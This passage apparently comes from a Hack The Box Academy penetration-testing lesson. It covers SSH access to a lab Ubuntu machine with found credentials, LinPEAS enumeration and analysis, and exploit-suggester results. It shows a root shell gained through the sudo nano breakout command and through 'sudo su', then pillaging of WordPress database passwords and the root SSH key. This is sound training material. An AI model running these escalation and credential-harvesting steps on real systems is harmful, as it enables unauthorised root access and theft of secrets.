To see these additional updates run: apt list --upgradable

7 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at <https://ubuntu.com/esm>

New release '24.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Feb 26 20:28:00 2025 from 10.10.16.14
john@ubuntu:~$

```

It appears the SSH key is working after all. Since this is another method of gaining initial access, we need note it down and make a screenshot for proof. Next, let’s try to use the credentials ( `john:SuperSecurePass123`) we found in the `.bash_history` file.

```shell
ssh [email protected]

[email protected]'s password: SuperSecurePass123

Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-135-generic x86_64)

 * Documentation:  <https://help.ubuntu.com>
 * Management:     <https://landscape.canonical.com>
 * Support:        <https://ubuntu.com/pro>

 System information as of Wed Feb 26 08:33:45 PM UTC 2025

  System load:           0.0
  Usage of /:            76.5% of 13.68GB
  Memory usage:          25%
  Swap usage:            14%
  Processes:             198
  Users logged in:       0
  IPv4 address for eth0: 10.129.12.10
  IPv6 address for eth0: dead:beef::250:56ff:feb9:20ab

Expanded Security Maintenance for Applications is not enabled.

153 updates can be applied immediately.
96 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

7 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at <https://ubuntu.com/esm>

New release '24.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Feb 26 20:31:19 2025 from 10.10.16.14
john@ubuntu:~$

```

This was also a success, indicating that the system is highly vulnerable to exploitation due to a misconfigured FTP service that permits an anonymous user to view and download critical files—and because of its overall ease of use. Let’s summarize what we have achieved in this stage"

- Three successful methods were demonstrated for gaining initial access to the target system.

- WordPress Hash Form plugin (v1.1.0) was vulnerable to RCE, allowing Meterpreter shell access as www-data user.

- SSH access was achieved using both John's private key and credentials found in `.bash_history` file.

- Initial reconnaissance through FTP provided all the necessary information to gain system access.

- System revealed to be Ubuntu 22.04.4 LTS running kernel 5.15.0-135-generic.


# Linux System Enumeration

* * *

Before we move on, we need to clarify an important aspect of the penetration testing process. Since we have successfully exploited our target and obtained access to it during the `Exploitation` stage, we should make a clear distinction between between these two stages: `Exploitation` & `Post-Exploitation`. As the names of these two suggest, both stages are about the exploitation. However, if you search for “penetration testing process” you will see many sources on the internet that will tell you that `Post-Exploitation` comes right after `Exploitation`.

This true, but necessarily all the time. The `Post-Exploitation` stage aims to obtain sensitive and security-relevant information from a local perspective that, in most cases, requires higher privileges than a standard user. This stage includes the following components:

|  |  |
| --- | --- |
| Evasive Testing | Information Gathering |
| Pillaging | Vulnerability Assessment |
| Privilege Escalation | Persistence |
| Data Exfiltration |  |

The main difference between the two is the level of access we have. In the `Exploitation` stage, we usually do not have any local or privileged access to any of the provided services of the target. However, in the `Post-Exploitation` stage we do. In other words, `Exploitation` stage is when we attack the the target system from outside and `Post-Exploitation` when we attack it from within.

Another important point that need to be mentioned is that you cannot escalate your privileges on a target system without gathering information from within it. If you don't know certain details about the system you're dealing with, such as the kernel being used, what users exist, what privileges they have, or how everything is configured, you will have very hard time to escalate the privileges.

For example, if we discover ( `Information Gathering`) another SSH private key on the target system (as the user `john`) and identify that it belongs to the user `root` (which is the administrator for Linux systems) ( `Vulnerability Assessment`), we could use it to log in to the target system with the highest possible privileges - which means we successfully escalated our privileges from the user `john` to `root`. In this case, this would bring us directly into the `Post-Exploitation` stage.

The transition from `Exploitation` to `Post-Exploitation` also occurs if we're obtain the highest possible privileges, after exploiting an exposed service from the outside the target system. Once we have these privileges, we can start to collect and extract valuable information from the target.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](tltx5IO6E8V5)

* * *

## Linux System Enumeration

System enumeration is a critical process where we gather detailed information about the compromised system. This information helps identify potential privilege escalation vectors, sensitive data, and system weaknesses. It allows us to understand the target environment thoroughly, which is essential for further steps. The goal here is to understand the system’s setup-how it is structured, what purpose it serves, what it does specifically, and what the implications are. Therefore, we need to collect at least the following pieces of information:

- `System Information`: OS version, kernel version, architecture, and installed patches

- `User Information`: Current user privileges, all users on the system, sudo rights

- `Network Information`: Network interfaces, routing tables, active connections

- `Running Services`: Active processes, listening ports, scheduled tasks

- `File System`: Interesting files, permissions issues, mounted drives

- `Installed Software`: Applications, versions, potential vulnerabilities

- `Security Mechanisms`: Firewall rules, SELinux status, AppArmor profiles


While all of this information can be obtained manually, there are also several tools that can automate the process. One of those tools is called Linux Privilege Escalation Awesome Script (LinPEAS). `LinPEAS` is a powerful enumeration tool designed to automatically detect possible privilege escalation vectors on Linux systems. It's part of the [Privilege Escalation Awesome Scripts Suite - Next Generation](https://github.com/peass-ng/PEASS-ng) ( `PEASS-ng`) toolkit.

The script performs comprehensive checks across the system, highlighting potential security issues with color-coded outputs for better visualization based on severity:

- `Red`: Highly probable privilege escalation vectors
- `Yellow`: Potential privilege escalation vectors that require further analysis
- `Green`: General information useful for manual enumeration

Key features of LinPEAS include, but not limited to:

- Automated detection of common privilege escalation vectors

- Identification of misconfigurations in services, cron jobs, and SUID/SGID binaries

- Detection of credentials in files, environment variables, or process memory

- Checking for vulnerable software versions and known kernel exploits

- Analysis of sudo privileges and other permission-related issues

- Enumeration of sensitive information that could aid lateral movement


Let’s download LinPEAS and utilize it against our target system. Therefore, we will use the following command on our attacking machine (Pwnbox):

```shell
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

--2025-02-27 06:22:39--  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: <https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/linpeas.sh> [following]
--2025-02-27 06:22:39--  <https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/linpeas.sh>
<SNIP>
linpeas.sh                      100%[=================================================================>] 820.39K  --.-KB/s    in 0.09s

2025-02-27 06:22:40 (8.96 MB/s) - ‘linpeas.sh’ saved [840082/840082]

```

```shell
ls

linpeas.sh id_rsa

```

Once downloaded, we can use the tool `scp` to upload the file to the target system by using obtained SSH access to the target.

```shell
# Command Syntax: scp -i <private-key> <file-to-transfer> <username>@<ip-address>:<path-to-store>

```

```shell
scp -i id_rsa ./linpeas.sh [email protected]:/home/john

linpeas.sh                                                                           100%  820KB   1.6MB/s   00:00

```

After we have successfully transferred the script, we can log in to the target and check if it’s there.

```shell
ssh -i id_rsa [email protected]

john@ubuntu:~$ ls

linpeas.sh  snap  WordPress_Blog_Setup_Update.txt

```

LinPEAS offers many different options. We can inspect them by using the `bash linpeas.sh --help` command.

```shell
bash linpeas.sh -h

Enumerate and search Privilege Escalation vectors.
This tool enum and search possible misconfigurations (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...) inside the host and highlight possible misconfigurations with colors.
        Checks:
            -a Perform all checks: 1 min of processes, su brute, and extra checks.
            -o Only execute selected checks (system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex). Select a comma separated list.
            -s Stealth & faster (don't check some time consuming checks)
            -e Perform extra enumeration
            -r Enable Regexes (this can take from some mins to hours)
            -P Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
            -D Debug mode

        Network recon:
            -t Automatic network scan - This option writes to files
            -d <IP/NETMASK> Discover hosts using fping or ping. Ex: -d 192.168.0.1/24
            -p <PORT(s)> -d <IP/NETMASK> Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports. Ex: -d 192.168.0.1/24 -p 53,139
            -i <IP> [-p <PORT(s)>] Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead. Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
             Notice that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed

        Port forwarding (reverse connection):
            -F LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT Execute linpeas to forward a port from a your host (LOCAL_IP:LOCAL_PORT) to a remote IP (REMOTE_IP:REMOTE_PORT)

        Firmware recon:
            -f </FOLDER/PATH> Execute linpeas to search passwords/file permissions misconfigs inside a folder

        Misc:
            -h To show this message
            -w Wait execution between big blocks of checks
            -L Force linpeas execution
            -M Force macpeas execution
            -q Do not show banner
            -N Do not use colours

```

Now, let’s execute the script and redirect its output to a new file called `linpeas_results.txt`. It may take a few minutes to complete, and you might see some errors which are not critical. Once we see see the default bash prompt again, we know that the script has finished..

```shell
john@ubuntu:~$ bash linpeas.sh -a -N > linpeas_results.txt

. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/uwsgi’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied
find: ‘/var/lib/nginx/scgi’: Permission denied
<SNIP>

john@ubuntu:~$

```

The results can then transferred back to our attacking machine, where we will analyze the results.

```shell
# Command Syntax: scp -i <private-key> <username>@<ip-address>:<file-to-download> <path-to-store>

```

```shell
scp -i id_rsa [email protected]:/home/john/linpeas_results.txt ./linpeas_results.txt

linpeas_results.txt                                                          100%  251KB 741.3KB/s   00:00

```


# Linux Vulnerability Assessment

* * *

After successfully running LinPEAS on the target system, we can now assess the results to see if there's any interesting data, low hanging fruits or potential vulnerabilities on the system. Looking at the image below, we will find ourselves within the vulnerability assessment stage. The goal here is to analyse the information we've collected, so that we can understand the system from within and and identify ways for further exploitation and privilege escalation.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](VVPdZz0sTdcW)

Now, let’s take a closer look at the results we obtained through LinPEAS by using the `cat` command. At the beginning we will see the basic information.

```shell
cat linpeas_results.txt

═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 5.15.0-135-generic (buildd@lcy02-amd64-070) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #146-Ubuntu SMP Sat Feb 15 17:06:22 UTC 2025
User & Groups: uid=1000(john) gid=1000(john) groups=1000(john),27(sudo)
Hostname: ubuntu

<SNIP>

```

This information contains the details about the operating system itself which is:

- OS: Ubuntu 22.04
- Kernel: 5.15.0 with a patch level 135-generic
- Compiler: gcc v11.4.0

This information is crucial because we might discover kernel exploits that leverage vulnerabilities in kernel functions to obtain `root` privileges. Additionally, we have observed that the user is a member of the `sudo` group, which grants them certain administrative privileges. Let’s take a closer look at the operating system setup.

```shell
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ <https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits>
Linux version 5.15.0-135-generic (buildd@lcy02-amd64-070) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #146-Ubuntu SMP Sat Feb 15 17:06:22 UTC 2025
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.4 LTS
Release:        22.04
Codename:       jammy

<SNIP>

```

Here it states that the target using the Ubuntu 22.04.4 LTS version with the codename `jammy`. This gives some insight into how well patched the system is. When we scroll down we will see the results of an another tool called `linux-exploit-suggester`, which is used in the `LinPEAS` script. This tools suggests that the current system might be vulnerable to specific and known vulnerabilities and provides some details, tags, and download urls where we can download the exploits from.

```shell
╔══════════╣ Executing Linux Exploit Suggester
╚ <https://github.com/mzet-/linux-exploit-suggester>
[+] [CVE-2022-0847] DirtyPipe

   Details: <https://dirtypipe.cm4all.com/>
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: <https://haxx.in/files/dirtypipez.c>

[+] [CVE-2021-4034] PwnKit

   Details: <https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt>
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: <https://codeload.github.com/berdav/CVE-2021-4034/zip/main>

<SNIP>

```

However, when we take a closer look at these results, we will see that Ubuntu 22 is not listed for these two exploits. This is an indicator that the vulnerabilities might be patched with the new releases. Now that we have a solid understanding of the operating system and kernel, we can move onto examining users, groups, and permissions .

```shell
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ <https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users>
uid=1000(john) gid=1000(john) groups=1000(john),27(sudo)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ <https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid>
Matching Defaults entries for john on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty

User john may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/nano
    (ALL : ALL) ALL

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(john) gid=1000(john) groups=1000(john),27(sudo)
<SNIP>
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(john)
<SNIP>

```

In short, we’re logged in as the user `john` on the target system with `sudo` privileges, meaning we can act as an admin. With `sudo`, we can run `nano` without a password and any command with a password. Another unusual point is that the user `www-data` (the user for the web server usually) is also in `john`'s group. This allows the user `www-data` at least to see the contents of `john`’s home directory.

Now let’s take a look at the software we have installed on the system.

```shell
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/snap/bin/lxc
/usr/bin/make
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget
<SNIP>

```

Having a list of software (such as the list LinPEAS generates) can aid us tremendously, particularly when it comes to tools we could theoretically make use of. For example, since we know that the system has `curl` and `wget` installed, we could utilize them to download files over HTTP from our target machine (Pwnbox). Another interesting software is, perl, php, and python because these allow us to execute specific code on the system, or use other scripts written in that language. Overall it extends our capabilities on the machine.

Further down, we are presented with a of possible protections present on the system.

```shell
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)

```

Here we can see that AppArmor is present but not fully accessible due to low privileges we currently have. It also seems that other protections like grsecurity, PaX, Execshield, and SELinux aren’t active or installed. Seccomp is off, but user namespaces and Cgroup2 are on. Address Space Layout Randomization (ASLR) is enabled for security, there’s no printer, and the system is running as a VMware virtual machine.

Based on our vulnerability assessment, here's what we've discovered and should note down:

- `System Information`: Ubuntu 22.04.4 LTS (jammy) with kernel version 5.15.0-135-generic

- `User Access`: We're logged in as user "john" who has `sudo` privileges, specifically able to run `nano` without a password

- `Unusual Configuration`: The `www-data` user (web server) is part of `john`'s group, potentially allowing access to `john`'s files

- `Available Tools`: The system has useful utilities installed including curl, wget, python, perl, and php that could be leveraged

- `Security Measures`: AppArmor is present but not fully accessible, ASLR is enabled

- `Potential Vulnerabilities`: The Linux Exploit Suggester identified some CVEs (DirtyPipe, PwnKit), but they might be patched in this Ubuntu version

- `Environment`: The system is running as a VMware virtual machine


Keep in mind that if you don’t know how to proceed from this stage to the exploitation stage, you haven’t gathered enough information. This indicates that you either missed something, didn’t collect sufficient data, or lack some necessary knowledge. At that point, you should return to the Information Gathering stage, review your results, double-check your steps, and verify that you covered everything required.

There are many other ways for vulnerability assessment. A great resource to learn more about it is the [Vulnerability Assessment](https://academy.hackthebox.com/course/preview/vulnerability-assessment) module.

In this case, however, we have enough information to move forward. Next, let's see what we can do with it and how we can put it to use.


# Linux Privilege Escalation

* * *

For privilege escalation on a Linux system, we aim to become the `root` user (aka superuser) on the target system. Let’s quickly recap what's been assessed thus far:

- `System Information`: Ubuntu 22.04.4 LTS (jammy) with kernel version 5.15.0-135-generic

- `User Access`: We're logged in as user "john" who has `sudo` privileges, specifically able to run `nano` without a password

- `Unusual Configuration`: The `www-data` user (web server) is part of `john`'s group, potentially allowing access to `john`'s files

- `Available Tools`: The system has useful utilities installed including curl, wget, python, perl, and php that could be leveraged

- `Security Measures`: AppArmor is present but not fully accessible, ASLR is enabled

- `Potential Vulnerabilities`: The Linux Exploit Suggester identified some CVEs (DirtyPipe, PwnKit), but they might be patched in this Ubuntu version

- `Environment`: The system is running as a VMware virtual machine


The entire topic about privilege escalation is vast and there is a lot to cover. In this module you will see just a few examples but if you want to dig deep we have a prepared module especially for Linux environments called [Linux Privilege Escalation](https://academy.hackthebox.com/course/preview/linux-privilege-escalation).

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](Rp4E1vHYMzKT)

When we examine the system as the `www-data` user, we can use the same steps as we did with the FTP server. Since this user is a member of `john`, we have permission to access `john`'s home directory and its files. Once again, we can retrieve the SSH private key and log in to the system via SSH without needing a password.

From here on, let’s once again examine the privileges of user `john`, focusing specifically on his sudo privileges. To do this, we can run the command `sudo -l`, which will list all the commands that can be executed using sudo.

```shell
john@ubuntu:~$ sudo -l

Matching Defaults entries for john on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty

User john may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/nano
    (ALL : ALL) ALL

```

The first part, "Matching Defaults", indicates that sudo commands adhere to specific security rules. These rules include resetting risky settings ( `env_reset`), notifying via email about incorrect passwords ( `mail_badpass`), ensuring that only safe program locations are used ( `secure_path`), and running commands securely (use\_pty). Regarding what john can do, there are two significant capabilites:

1. He can run `/usr/bin/nano` as root without typing a password ( `NOPASSWD`), making it extremely convenient to edit system files

2. He can run any command as any user or group ( `(ALL : ALL) ALL`), effectively granting full administrative privileges, though he must enter his password for all commands except for `nano`.


The “ [Get The F\*\*\* Out Bins](https://gtfobins.github.io/)” ( `GTFObins`) project documents several techniques to help security professionals understand and mitigate privilege escalation risks. It provides a list of binaries that can be exploited to bypass certain restrictions within specific scenarios/cases. In this case, we are using `nano` with sudo privileges to break out to a root shell. Basically, we are opening the `nano` text editor as the user `root` and need to find a way how to spawn a shell. This can be done in many different ways. One of the ways is shown [here](https://gtfobins.github.io/gtfobins/nano/#sudo) that we will try now.

The sequence "^R^X" ( `[CTRL+R]` `[CTRL+X]`) in `nano` opens a command execution prompt, which is then used to `reset` the terminal and spawn a `/bin/bash` shell, in this case, with the privileges of the user used for this `nano` session ( `root`). Let’s try it out.

```shell
john@ubuntu:~$ sudo /usr/bin/nano privesc

^R^X
reset; /bin/bash 1>&0 2>&0
id

uid=0(root) gid=0(root) groups=0(root)

```

![GIF showcasing the privilege escalation to the root user using the nano binary.](yFHYG0kCki6Z.gif)

We would typically use this approach if we did not know password for the user `john` . However, because we do in fact have this user’s password, privilege escalation is even easier. Incidentally, we just need to use the command `sudo su`. This command allows us to change the current shell session to the “super user” ( `su`) which also known as `root`.

```shell
john@ubuntu:~$ sudo su

[sudo] password for john: SuperSecurePass123

root@ubuntu:/home/john# id

uid=0(root) gid=0(root) groups=0(root)

```

* * *

Now, we have achieved the highest possible privileges on a Linux system and identified several methods by which a malicious actor could exploit it. However, the post-exploitation stage isn’t complete yet—we still need to document our actions and the results we obtained. Our notes might look something like this:

#### Linux Privilege Escalation Methods:

- Using access to a user's group membership ( `www-data` was in `john`'s group)
- Leveraging sudo privileges ( `john` could run `nano` as `root`)
- Using GTFObins techniques to break out of restricted applications
- Direct privilege escalation via `sudo su` with known credentials

#### Techniques Demonstrated:

- Command `sudo -l` to list available sudo privileges
- Breaking out of `nano` using `^R^X` sequence to spawn a root shell
- Using `sudo su` with user password to directly gain root access

#### Security Implications:

- Granting sudo access for specific applications can lead to full system compromise
- Improper group memberships can allow lateral movement across user accounts
- Even common tools like text editors can be weaponized for privilege escalation

Finally, to complete the post-exploitation stage, we need to analyze the entire system again—this time using our new administrative privileges. This allows us to examine every configuration file that was previously inaccessible and uncover any other interesting files.


# Linux Pillaging

* * *

The term `pillaging` refers to the process of extracting valuable information from a compromised system for purposes such as privilege escalation, lateral movement, or data exfiltration. For our current situation, in terms of pillaging we perform many of the same actions as during system enumeration. However, now that we have the highest possible privileges, we can access sensitive files that were previously off-limits. By reviewing system and service configuration files, we can uncover critical details like additional usernames, passwords, databases, and much more.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](BxhrzqnHSwQO)

Let's begin by running `linpeas.sh` again but this time as root and see what else we can find on the target system.

```shell
root@ubuntu:~# bash /home/john/linpeas.sh

<SNIP>
╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
/dev/disk/by-uuid/790c151f-485f-4bba-b3ed-fe9b06df494a / ext4 defaults 0 1
/dev/disk/by-uuid/35a4e304-7894-4205-9531-118c4571fde9 none swap sw 0 0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk
sda
sda1
sda2
sda3

```

At this point, it’s worth mentioning that some file systems are not currently mounted on the system. One of these is formatted as EXT4, while another is labeled as `swap`, which provides additional memory space. If we want to delve deeper, we could try to mount these file systems for further analysis. Additionally, we can see that there are a total of 5 disks (or partitions) on the hard drive.

Next, we can take a look and see what the `linux exploit suggester` suggests and what potential vulnerabilities it might find.

```shell
╔══════════╣ Executing Linux Exploit Suggester
╚ <https://github.com/mzet-/linux-exploit-suggester>
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: <https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/>
<https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/>
   Exposure: probable
   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
   Download URL: <https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c>
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

<SNIP>

```

The tool suggests that there's additional exploit, one that we didn't see before that fits the target's version of Ubuntu. It would be interesting to see if we could determine the presence of this vulnerability while using a low-privilege account. Just because a tool cannot find something, doesn't mean it isn't there.

Like we mentioned earlier, because we have the highest possible privileges, we can access any file on the system. This means that we can find active credentials that are being used by the system. Often time, administrators and developers reuse their credentials. With one of these passwords, we might be able to use it for lateral movement and privilege escalation across the entire internal network. If we look at the output of our script a bit further, we will see that `LinPEAS` found another set of credentials for WordPress. We need to add it to our notes for future use.

```shell
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rwxr-xr-x 1 root root 3323 Feb 15 18:20 /var/www/cube-case.htb/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'MyVeryStrongPa$$' );
define( 'DB_HOST', 'localhost' );

```

After the exploitation stage, we saw that `LinPEAS` detected the usage of AppArmor but couldn’t see the profiles that are being used for it. Now, we can.

```shell
╔══════════╣ Protections
═╣ AppArmor enabled? .............. apparmor module is loaded.
18 profiles are loaded.
18 profiles are in enforce mode.
   /snap/snapd/23258/usr/lib/snapd/snap-confine
   /snap/snapd/23258/usr/lib/snapd/snap-confine//mount-namespace-capture-helper
   /snap/snapd/23545/usr/lib/snapd/snap-confine
   /snap/snapd/23545/usr/lib/snapd/snap-confine//mount-namespace-capture-helper
   snap-update-ns.lxd
   snap.lxd.activate
   snap.lxd.benchmark
   snap.lxd.buginfo
   snap.lxd.check-kernel
   snap.lxd.daemon
   snap.lxd.hook.configure
   snap.lxd.hook.install
   snap.lxd.hook.remove
   snap.lxd.lxc
   snap.lxd.lxc-to-lxd
   snap.lxd.lxd
   snap.lxd.migrate
   snap.lxd.user-daemon
0 profiles are in complain mode.
0 profiles are in kill mode.
0 profiles are in unconfined mode.
0 processes have profiles defined.
0 processes are in enforce mode.
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.
0 processes are in mixed mode.
0 processes are in kill mode.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)

```

It shows that there are 18 profiles loaded, all in enforce mode and securing `snapd` and `lxd`. Snapd is a package management system for self-contained and cross-distribution software packages. LXD is a container and virtual machine manager with which we can create isolated VMs. The AppArmor setup indicates that these two applications are restricted by mandatory access controls, and might limit the exploitation techniques or unauthorized access within.

```shell
╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)
<SNIP>

-rw------- 1 root root 2602 May 27  2024 /root/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<SNIP>
MQOhMIx1e3V8OT+KRFa8aWdo942uyOZK8YmrGkHe67JGf+a8PxW3iIjim5BpPIHhLuvC/H
aXQg+2KDILO/tdAAAAC3Jvb3RAdWJ1bnR1AQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----

```

When we look a bit further, we will see that the user `root` also has a SSH private key. This is a huge finding for us, as administrators generally use them sparingly, and only when they want to connect and manage other machines. With this key, we potentially could get `root` level access right away (depending on whether the administrator used this key for other machines.) This would be a quick and critical compromise of the entire business network.

As we continue to study `linpeas.sh` output, we can see it mentions the `.bash_history` file for the `root` user. We will absolutely want to check this file out, as it stores the commands used by the administrator and could reveal other points of access.

```shell
═╣ Can I read root folder? .............. total 148
drwx------ 12 root root  4096 Feb 27 20:29 .
drwxr-xr-x 19 root root  4096 Feb 15 17:57 ..
-rw-------  1 root root  3281 Mar  3 09:07 .bash_history
-rw-r--r--  1 root root  3106 Oct 15  2021 .bashrc
drwx------  3 root root  4096 Jun  6  2024 .cache
<SNIP>
-rw-r-----  1 root root    33 Jun  3  2024 root.txt
-rw-------  1 root root 13218 Sep  2 13:18 server.config.yaml
drwx------  3 root root  4096 Apr 27  2023 snap
drwx------  2 root root  4096 Feb 11 09:18 .ssh
-rw-r--r--  1 root root     0 Feb 15 17:35 .sudo_as_admin_successful
-rw-r--r--  1 root root  8407 Jun  6  2024 sysmon-conf.xml
-rw-------  1 root root 13212 Feb 27 20:29 .viminfo
<SNIP>

```

Additionally, we have developed a pillaging bash script that, while not as in-depth as LinPEAS, provides a clear overview of what exists on the system. You can download the script from the Resources section in this module, located above the list of sections. After transferring the file to the target system, you can run it just like LinPEAS. The script creates a directory in `/tmp` where it stores all the results.

```shell
root@ubuntu:~# bash linpill.sh

<SNIP>
=== Summary of Key Findings ===
Interesting Files Found: 28742
Sensitive Files Found: 2
Writable PATH Directories: 1
SUID/SGID Binaries: 55
Pillaging complete. All data saved to /tmp/Pillaging_ubuntu_2025-03-03_10-01-05
Completed at: 2025-03-03 10:01:34

root@ubuntu:~# ls -l /tmp/Pillaging_ubuntu_2025-03-03_10-01-05/

total 216
-rw-r--r-- 1 root root    187 Mar  3 10:01 ARPCache.txt
-rw-r--r-- 1 root root   2671 Mar  3 10:01 CPUInfo.txt
-rw-r--r-- 1 root root    228 Mar  3 10:01 CronJobs.txt
-rw-r--r-- 1 root root     86 Mar  3 10:01 DistroInfo.txt
-rw-r--r-- 1 root root    837 Mar  3 10:01 IPConfig.txt
-rw-r--r-- 1 root root    413 Mar  3 10:01 IPTablesRules.txt
-rw-r--r-- 1 root root   1152 Mar  3 10:01 ListeningPorts.txt
-rw-r--r-- 1 root root    207 Mar  3 10:01 MemInfo.txt
-rw-r--r-- 1 root root    108 Mar  3 10:01 OSInfo.txt
-rw-r--r-- 1 root root 119489 Mar  3 10:01 Packages.txt
-rw-r--r-- 1 root root     15 Mar  3 10:01 PasswordPolicy.txt
-rw-r--r-- 1 root root  17492 Mar  3 10:01 Processes.txt
-rw-r--r-- 1 root root     85 Mar  3 10:01 SensitiveFiles.txt
-rw-r--r-- 1 root root   3257 Mar  3 10:01 Services.txt
